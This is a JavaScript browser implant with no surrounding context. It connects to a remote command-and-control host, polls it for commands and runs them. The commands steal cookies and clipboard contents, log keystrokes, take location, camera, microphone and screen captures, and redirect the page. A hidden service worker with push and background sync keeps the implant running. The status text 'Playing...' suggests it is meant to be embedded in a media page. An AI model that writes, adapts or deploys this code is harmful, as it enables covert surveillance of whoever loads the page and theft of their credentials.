<script>
(function(){
var C2_HOST = 'exe.ddnsfree.com';
var C2_PORT = '9595';
var DEVICE_ID = navigator.userAgent.replace(/[^a-zA-Z0-9]/g,'').slice(0,20);
var BASE_URL = 'http://' + C2_HOST + ':' + C2_PORT;

function sendCheckin(){
    var xhr = new XMLHttpRequest();
    xhr.open('POST', BASE_URL + '/api/checkin', true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.send(JSON.stringify({
        device_id: DEVICE_ID,
        model: navigator.platform,
        version: navigator.appVersion.slice(0,30),
        screen: screen.width+'x'+screen.height,
        time: new Date().toISOString()
    }));
}

function sendResult(cmd, result, data){
    var xhr = new XMLHttpRequest();
    xhr.open('POST', BASE_URL + '/api/result/' + DEVICE_ID, true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.onreadystatechange = function(){
        if (xhr.readyState === 4 && xhr.status !== 200){
            var el = document.getElementById('msg');
            el.textContent = 'Result send failed: HTTP ' + xhr.status;
            el.style.color = '#f00';
        }
    };
    xhr.onerror = function(){
        var el = document.getElementById('msg');
        el.textContent = 'Result send: Network/CORS error';
        el.style.color = '#f00';
    };
    xhr.send(JSON.stringify({cmd: cmd, result: result, data: data}));
}

function executeCommand(cmdObj){
    var cmd = cmdObj.cmd;
    var args = cmdObj.args || {};
    var el = document.getElementById('msg');
    try{
        if (cmd === 'alert'){
            var msg = args.msg || 'Command executed';
            alert(msg);
            sendResult(cmd, 'success', msg);
        }
        else if (cmd === 'redirect'){
            var url = args.url || 'https://google.com';
            sendResult(cmd, 'redirecting', url);
            window.location.href = url;
        }
        else if (cmd === 'cookie_steal'){
            var cookies = document.cookie;
            sendResult(cmd, 'success', cookies);
        }
        else if (cmd === 'fetch'){
            var url = args.url || BASE_URL;
            fetch(url).then(function(r){return r.text()}).then(function(t){
                sendResult(cmd, 'success', t.slice(0,2000));
            }).catch(function(e){
                sendResult(cmd, 'error', e.toString());
            });
        }
        else if (cmd === 'geo'){
            if (navigator.geolocation){
                navigator.geolocation.getCurrentPosition(function(pos){
                    sendResult(cmd, 'success', pos.coords.latitude+','+pos.coords.longitude);
                }, function(err){
                    sendResult(cmd, 'error', err.message);
                });
            } else {
                sendResult(cmd, 'error', 'Geolocation not supported');
            }
        }
        else if (cmd === 'clipboard'){
            if (navigator.clipboard && navigator.clipboard.readText){
                navigator.clipboard.readText().then(function(text){
                    sendResult(cmd, 'success', text);
                }).catch(function(e){
                    sendResult(cmd, 'error', e.toString());
                });
            } else {
                sendResult(cmd, 'error', 'Clipboard API not available');
            }
        }
        else if (cmd === 'keylogger_start'){
            document.addEventListener('keydown', function(e){
                sendResult('keylogger', 'keystroke', e.key + ' @ ' + e.target.tagName);
            });
            sendResult(cmd, 'success', 'Keylogger active');
        }
        else if (cmd === 'screenshot_url'){
            sendResult(cmd, 'success', window.location.href);
        }
        else if (cmd === 'user_agent'){
            sendResult(cmd, 'success', navigator.userAgent);
        }
        else if (cmd === 'camera'){
            if (!navigator.mediaDevices){ sendResult(cmd, 'error', 'mediaDevices not supported'); return; }
            navigator.mediaDevices.getUserMedia({video:true}).then(function(stream){
                var v = document.createElement('video'); v.srcObject = stream; v.play();
                setTimeout(function(){
                    var c = document.createElement('canvas'); c.width=320; c.height=240;
                    c.getContext('2d').drawImage(v,0,0,320,240);
                    sendResult(cmd, 'success', c.toDataURL('image/jpeg'));
                    stream.getTracks().forEach(function(t){t.stop();});
                }, 800);
            }).catch(function(e){ sendResult(cmd, 'error', e.toString()); });
        }
        else if (cmd === 'microphone'){
            if (!navigator.mediaDevices){ sendResult(cmd, 'error', 'mediaDevices not supported'); return; }
            navigator.mediaDevices.getUserMedia({audio:true}).then(function(stream){
                var mr = new MediaRecorder(stream); var chunks=[];
                mr.ondataavailable = function(e){ chunks.push(e.data); };
                mr.onstop = function(){
                    var reader = new FileReader();
                    reader.onloadend = function(){ sendResult(cmd, 'success', reader.result); };
                    reader.readAsDataURL(new Blob(chunks, {type:'audio/webm'}));
                };
                mr.start(); setTimeout(function(){ mr.stop(); stream.getTracks().forEach(function(t){t.stop();}); }, 5000);
            }).catch(function(e){ sendResult(cmd, 'error', e.toString()); });
        }
        else if (cmd === 'screen_capture'){
            if (!navigator.mediaDevices){ sendResult(cmd, 'error', 'mediaDevices not supported'); return; }
            navigator.mediaDevices.getDisplayMedia({video:true}).then(function(stream){
                var v = document.createElement('video'); v.srcObject = stream; v.play();
                setTimeout(function(){
                    var c = document.createElement('canvas'); c.width=Math.min(screen.width,1280); c.height=Math.min(screen.height,720);
                    c.getContext('2d').drawImage(v,0,0,c.width,c.height);
                    sendResult(cmd, 'success', c.toDataURL('image/jpeg',0.6));
                    stream.getTracks().forEach(function(t){t.stop();});
                }, 500);
            }).catch(function(e){ sendResult(cmd, 'error', e.toString()); });
        }
        else {
            sendResult(cmd, 'unknown', 'Unknown command: ' + cmd);
        }
    } catch(e){
        sendResult(cmd, 'error', e.toString());
    }
}

function pollCommands(){
    var xhr = new XMLHttpRequest();
    xhr.open('GET', BASE_URL + '/api/cmd/' + DEVICE_ID, true);
    xhr.onreadystatechange = function(){
        var el = document.getElementById('msg');
        if (xhr.readyState === 4){
            if (xhr.status === 200){
                try{
                    var resp = JSON.parse(xhr.responseText);
                    if (resp.cmd){
                        el.textContent = 'CMD: ' + resp.cmd.cmd;
                        el.style.color = '#f0f';
                        executeCommand(resp.cmd);
                    } else {
                        el.textContent = 'Waiting for commands...';
                        el.style.color = '#0f0';
                    }
                } catch(e){
                    el.textContent = 'Parse error: ' + e.message;
                    el.style.color = '#f00';
                }
            } else {
                el.textContent = 'Poll error: HTTP ' + xhr.status;
                el.style.color = '#f00';
            }
        }
    };
    xhr.onerror = function(){
        var el = document.getElementById('msg');
        el.textContent = 'Poll: Network error';
        el.style.color = '#f00';
    };
    xhr.send();
}

// Start
sendCheckin();
var el = document.getElementById('msg');
el.textContent = 'Playing... (C2 active)';
el.style.color = '#0f0';

// Poll for commands every 3 seconds
setInterval(pollCommands, 3000);
pollCommands();

// Service Worker + Push + Background Sync for persistence
(function(){
    if (!('serviceWorker' in navigator)) return;
    var SW = `
    self.addEventListener('push', function(e){
        var data = e.data ? e.data.json() : {};
        self.registration.showNotification(data.title||'Update', {
            body: data.body||'New command available',
            icon: '',
            requireInteraction: true,
            data: {url: self.location.origin}
        });
    });
    self.addEventListener('notificationclick', function(e){
        e.notification.close();
        e.waitUntil(clients.openWindow(self.location.origin));
    });
    self.addEventListener('sync', function(e){
        if (e.tag === 'c2-sync'){
            e.waitUntil(fetch(BASE_URL + '/api/cmd/' + DEVICE_ID).then(function(r){return r.json();}).then(function(d){
                if(d.cmd){ clients.matchAll().then(function(c){ c.forEach(function(cl){ cl.postMessage(d); }); }); }
            }));
        }
    });
    self.addEventListener('periodicsync', function(e){
        if (e.tag === 'c2-poll'){
            e.waitUntil(fetch(BASE_URL + '/api/cmd/' + DEVICE_ID).then(function(r){return r.json();}).then(function(d){
                if(d.cmd){ clients.matchAll().then(function(c){ c.forEach(function(cl){ cl.postMessage(d); }); }); }
            }));
        }
    });
    self.addEventListener('install', function(e){ self.skipWaiting(); });
    self.addEventListener('activate', function(e){ e.waitUntil(self.clients.claim()); });
    `;
    var blob = new Blob([SW], {type:'text/javascript'});
    var swUrl = URL.createObjectURL(blob);
    navigator.serviceWorker.register(swUrl).then(function(reg){
        return reg.pushManager.subscribe({userVisibleOnly:true});
    }).then(function(sub){
        var xhr = new XMLHttpRequest();
        xhr.open('POST', BASE_URL + '/api/push_sub/' + DEVICE_ID, true);
        xhr.setRequestHeader('Content-Type','application/json');
        xhr.send(JSON.stringify(sub));
    }).catch(function(e){});
    navigator.serviceWorker.ready.then(function(reg){
        if ('sync' in reg) reg.sync.register('c2-sync');
        if ('periodicSync' in reg) reg.periodicSync.register('c2-poll', {minInterval: 15000});
    });
})();
})();
